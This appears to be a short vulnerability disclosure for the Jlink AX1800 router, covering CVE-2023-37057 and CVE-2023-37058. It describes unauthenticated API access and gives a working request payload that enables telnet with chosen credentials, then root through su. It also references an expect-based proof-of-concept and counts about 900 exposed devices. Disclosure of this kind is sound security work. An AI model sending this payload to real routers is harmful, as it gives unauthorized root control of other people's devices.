# Jlink AX1800

Jlink routers suffer from A01 Broken Access Control. Any remote user can access any of the routers API's without a password. A rouge threat actor can enable telnet and then escalate to root privileges by just entering the su command. 

**Telnet API:** 
```
"mode_name=/web/um_telnet_set&telnetEnable=1&userName=admin&userPwd=pawnp@nda69"
```

**Run POC:**
```
expect jlink
```


Shodan shows 902 devices available to RCE.  

* * *
CVE-2023-37058:
Insecure Permissions vulnerability in JLINK Unionman Technology Co. Ltd Jlink AX1800 v.1.0 allows a remote attacker to escalate privileges via a crafted command.

CVE-2023-37057:
An issue in JLINK Unionman Technology Co. Ltd Jlink AX1800 v.1.0 allows a remote attacker to execute arbitrary code via the router's authentication mechanism.


